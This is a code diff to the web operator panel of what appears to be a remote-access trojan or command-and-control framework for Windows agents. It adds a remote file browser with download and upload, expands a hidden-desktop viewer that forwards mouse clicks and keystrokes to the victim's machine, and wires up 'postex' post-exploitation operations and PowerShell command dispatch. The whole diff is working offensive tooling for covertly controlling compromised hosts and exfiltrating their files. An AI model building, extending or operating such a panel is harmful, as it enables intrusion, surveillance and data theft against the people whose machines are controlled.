@@ -217,7 +217,8 @@
             case 'agent_result':
                 addEventLog('agent_result', data.agent_id + ': ' + data.command);
                 if (consoleTabs[data.agent_id]) {
-                    appendConsole(data.agent_id, data.output, 'output');
+                    if (data.output && String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
+                    else appendConsole(data.agent_id, data.output, 'output');
                 }
                 for (var i = 0; i < agents.length; i++) {
                     if (agents[i].id === data.agent_id) {
@@ -370,6 +371,10 @@
                 case 'recon':
                     await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'recon' });
                     break;
+                case 'files':
+                    openConsole(selectedAgentId);
+                    listFiles(selectedAgentId);
+                    break;
                 case 'download':
                     var dl = prompt('Remote file path:');
                     if (dl) await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'download', path: dl });
@@ -432,8 +437,19 @@
                         '<button type="button" class="glass-btn" data-hd="frame">Frame</button>' +
                         '<button type="button" class="glass-btn" data-hd="stop">Stop</button>' +
                     '</div>' +
+                    '<canvas class="hd-img" id="hd-canvas-' + escapeHtml(agentId) + '" tabindex="0" style="display:none"></canvas>' +
                     '<img class="hd-img" id="hd-img-' + escapeHtml(agentId) + '" alt="" tabindex="0" style="display:none">' +
                     '<input type="text" class="hd-type" id="hd-type-' + escapeHtml(agentId) + '" placeholder="Type on the hidden desktop, Enter to send">' +
+                '</div>' +
+                '<div class="fs-pane" id="fs-' + escapeHtml(agentId) + '">' +
+                    '<div class="hd-bar">' +
+                        '<span>Files</span>' +
+                        '<input type="text" class="fs-path" id="fs-path-' + escapeHtml(agentId) + '" value="C:\\Users\\Public">' +
+                        '<button type="button" class="glass-btn" data-fs="list">List</button>' +
+                        '<button type="button" class="glass-btn" data-fs="up">Up</button>' +
+                        '<label class="glass-btn">Upload<input type="file" class="fs-upload" id="fs-up-' + escapeHtml(agentId) + '" hidden></label>' +
+                    '</div>' +
+                    '<div class="fs-list" id="fs-list-' + escapeHtml(agentId) + '"></div>' +
                 '</div>';
             document.getElementById('tab-content').appendChild(pane);
 
@@ -453,15 +469,36 @@
             pane.querySelectorAll('[data-hd]').forEach(function(btn) {
                 btn.addEventListener('click', function() { desktopActionFor(agentId, btn.dataset.hd); });
             });
-            var img = document.getElementById('hd-img-' + agentId);
-            img.addEventListener('click', function(e) {
+            function visibleDesktop() {
+                var canvas = document.getElementById('hd-canvas-' + agentId);
+                var img = document.getElementById('hd-img-' + agentId);
+                if (canvas && canvas.style.display !== 'none') return canvas;
+                if (img && img.style.display !== 'none') return img;
+                return canvas || img;
+            }
+            function desktopClick(e, right) {
+                var img = visibleDesktop();
+                if (!img || (e.target !== img && !img.contains(e.target))) return;
+                e.preventDefault();
+                e.stopPropagation();
                 var rect = img.getBoundingClientRect();
                 if (!rect.width || !rect.height) return;
-                var screen = desktopScreen[agentId] || {w: 1024, h: 768};
+                var screen = desktopScreen[agentId] || {w: img.width || 1280, h: img.height || 800};
                 var x = Math.round((e.clientX - rect.left) / rect.width * screen.w);
                 var y = Math.round((e.clientY - rect.top) / rect.height * screen.h);
-                desktopActionFor(agentId, 'click ' + x + ' ' + y);
-            });
+                if (x < 0) x = 0;
+                if (y < 0) y = 0;
+                if (x >= screen.w) x = screen.w - 1;
+                if (y >= screen.h) y = screen.h - 1;
+                var status = document.getElementById('hd-status-' + agentId);
+                if (status) status.textContent = (right ? 'rclick ' : 'click ') + x + ' ' + y;
+                img.focus();
+                desktopActionFor(agentId, (right ? 'rclick ' : 'click ') + x + ' ' + y);
+                setTimeout(function() { desktopActionFor(agentId, 'frame'); }, 700);
+            }
+            var hdPane = document.getElementById('hd-' + agentId);
+            hdPane.addEventListener('pointerdown', function(e) { desktopClick(e, e.button === 2); });
+            hdPane.addEventListener('contextmenu', function(e) { e.preventDefault(); });
             img.addEventListener('keydown', function(e) {
                 if (e.key.length === 1) desktopActionFor(agentId, 'type ' + e.key);
                 else if (e.key === 'Enter') desktopActionFor(agentId, 'key 13');
@@ -474,6 +511,28 @@
                 if (!typer.value) return;
                 desktopActionFor(agentId, 'type ' + typer.value);
                 typer.value = '';
+            });
+            pane.querySelector('[data-fs="list"]').addEventListener('click', function() { listFiles(agentId); });
+            pane.querySelector('[data-fs="up"]').addEventListener('click', function() {
+                var box = document.getElementById('fs-path-' + agentId);
+                var parts = box.value.replace(/\\+$/, '').split('\\');
+                if (parts.length > 1) parts.pop();
+                box.value = parts.join('\\') || 'C:\\';
+                listFiles(agentId);
+            });
+            pane.querySelector('.fs-upload').addEventListener('change', function(ev) {
+                var file = ev.target.files && ev.target.files[0];
+                ev.target.value = '';
+                if (!file) return;
+                if (file.size > 400000) { addEventLog('files', 'upload too large'); return; }
+                var reader = new FileReader();
+                reader.onload = function() {
+                    var b64 = String(reader.result).split(',')[1] || '';
+                    var dest = document.getElementById('fs-path-' + agentId).value.replace(/\\+$/, '') + '\\' + file.name;
+                    api('POST', '/agents/' + agentId + '/command', { command: '__fs:put:' + dest + '\t' + b64 });
+                    addEventLog('files', 'upload ' + dest);
+                };
+                reader.readAsDataURL(file);
             });
             consoleTabs[agentId] = { tab: tab, pane: pane, focusDesktop: false };
         }
@@ -674,21 +733,100 @@
 
     function openDesktop(agentId) {
         openConsole(agentId, true);
-        var img = document.getElementById('hd-img-' + agentId);
+        watchDesktop(agentId);
+        desktopActionFor(agentId, 'start');
+        var img = document.getElementById('hd-canvas-' + agentId);
         if (img) img.focus();
-        if (!desktopTimers[agentId]) {
-            desktopActionFor(agentId, 'start C:\\Windows\\explorer.exe');
-            desktopTimers[agentId] = setInterval(function() {
-                api('POST', '/agents/' + agentId + '/desktop', { command: 'frame' }).catch(function() {});
-                pollDesktop(agentId);
-            }, 2500);
+    }
+
+    async function listFiles(agentId) {
+        var path = document.getElementById('fs-path-' + agentId).value || 'C:\\';
+        var ps = path.replace(/\\/g, '/');
+        await api('POST', '/agents/' + agentId + '/command', { command: 'powershell -c Get-ChildItem -Name ' + ps });
+        addEventLog('files', 'list ' + path);
+        setTimeout(function() { showFileList(agentId, path); }, 2500);
+    }
+
+    async function showFileList(agentId, path) {
+        var box = document.getElementById('fs-list-' + agentId);
+        if (!box) return;
+        var rows = await api('GET', '/agents/' + agentId + '/results');
+        if (!rows) return;
+        for (var i = rows.length - 1; i >= 0; i--) {
+            var cmd = rows[i].command || '';
+            var out = rows[i].output || '';
+            if ((cmd.indexOf('dir ') === 0 || cmd.indexOf('__fs:ls:') === 0) && out.indexOf('HDIMG:') !== 0 && out.indexOf('FILE:') !== 0) {
+                var entries = [];
+                if (cmd.indexOf('__fs:ls:') === 0) {
+                    out.split('\n').filter(Boolean).forEach(function(line) {
+                        var bits = line.split(' ');
+                        var kind = bits.shift();
+                        bits.shift();
+                        entries.push({ kind: kind, name: bits.join(' ') });
+                    });
+                } else {
+                    out.split('\n').forEach(function(line) {
+                        var name = line.trim();
+                        if (!name || name === '.' || name === '..') return;
+                        if (name.indexOf('File Not Found') === 0 || name.indexOf('Get-ChildItem') === 0) return;
+                        entries.push({ kind: name.indexOf('.') < 0 ? 'd' : 'f', name: name });
+                    });
+                }
+                box.innerHTML = entries.map(function(row) {
+                    return '<button type="button" class="fs-row" data-kind="' + row.kind + '" data-name="' + escapeHtml(row.name) + '">' +
+                        escapeHtml((row.kind === 'd' ? 'dir  ' : 'file ') + row.name) + '</button>';
+                }).join('') || escapeHtml(out.slice(0, 400));
+                box.querySelectorAll('.fs-row').forEach(function(btn) {
+                    btn.addEventListener('click', function() {
+                        var next = path.replace(/\\+$/, '') + '\\' + btn.dataset.name;
+                        if (btn.dataset.kind === 'd') {
+                            document.getElementById('fs-path-' + agentId).value = next;
+                            listFiles(agentId);
+                        } else {
+                            api('POST', '/agents/' + agentId + '/postex', { op: 'download', path: next });
+                            addEventLog('files', 'get ' + next);
+                            setTimeout(function() { saveRemoteFile(agentId, btn.dataset.name); }, 2500);
+                        }
+                    });
+                });
+                return;
+            }
         }
+    }
+
+    async function saveRemoteFile(agentId, name) {
+        var rows = await api('GET', '/agents/' + agentId + '/results');
+        if (!rows) return;
+        for (var i = rows.length - 1; i >= 0; i--) {
+            var out = rows[i].output || '';
+            if (out.indexOf('FILE:') === 0) {
+                var a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + out.slice(5);
+                a.download = name || 'download.bin';
+                a.click();
+                return;
+            }
+        }
+    }
+
+    var frameBusy = {};
+    function watchDesktop(agentId) {
+        if (desktopTimers[agentId]) return;
+        desktopTimers[agentId] = setInterval(function() {
+            if (frameBusy[agentId]) return;
+            frameBusy[agentId] = true;
+            api('POST', '/agents/' + agentId + '/desktop', { command: 'frame' }).catch(function() {}).then(function() {
+                frameBusy[agentId] = false;
+                pollDesktop(agentId);
+            });
+        }, 2000);
     }
 
     async function desktopActionFor(agentId, action) {
         addEventLog('desktop', agentId + ' ' + action);
+        if (action === 'start' || action.indexOf('start ') === 0) watchDesktop(agentId);
         await api('POST', '/agents/' + agentId + '/desktop', { command: action });
-        setTimeout(function() { pollDesktop(agentId); }, 1500);
+        setTimeout(function() { pollDesktop(agentId); }, 800);
     }
 
     function bmpToPng(b64) {
@@ -722,6 +860,8 @@
         return canvas.toDataURL('image/png');
     }
 
+    var lastFramePayload = {};
+
     function showDesktopFrame(agentId, out) {
         if (!out || out.indexOf('HDIMG:') !== 0) return;
         var payload = out.slice(6);
@@ -733,17 +873,32 @@
             desktopScreen[agentId].h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen[agentId].h;
             payload = payload.slice(colon + 1);
         }
-        var img = document.getElementById('hd-img-' + agentId);
+        if (lastFramePayload[agentId] === payload) return;
+        var canvas = document.getElementById('hd-canvas-' + agentId);
         var status = document.getElementById('hd-status-' + agentId);
-        if (img) {
-            try {
-                img.src = bmpToPng(payload);
-                img.style.display = 'block';
-                if (status) status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
-            } catch (err) {
-                img.style.display = 'none';
-                if (status) status.textContent = 'frame decode failed';
-            }
+        if (!canvas) return;
+        try {
+            var url = payload.indexOf('/9j/') === 0 ? ('data:image/jpeg;base64,' + payload) : bmpToPng(payload);
+            var next = new Image();
+            next.onload = function() {
+                var back = document.createElement('canvas');
+                back.width = next.naturalWidth;
+                back.height = next.naturalHeight;
+                back.getContext('2d').drawImage(next, 0, 0);
+                if (canvas.width !== back.width || canvas.height !== back.height) {
+                    canvas.width = back.width;
+                    canvas.height = back.height;
+                }
+                canvas.getContext('2d').drawImage(back, 0, 0);
+                canvas.style.display = 'block';
+                lastFramePayload[agentId] = payload;
+                if (status && status.textContent.indexOf('click') !== 0 && status.textContent.indexOf('rclick') !== 0) {
+                    status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
+                }
+            };
+            next.src = url;
+        } catch (err) {
+            if (status) status.textContent = 'frame decode failed';
         }
     }
 
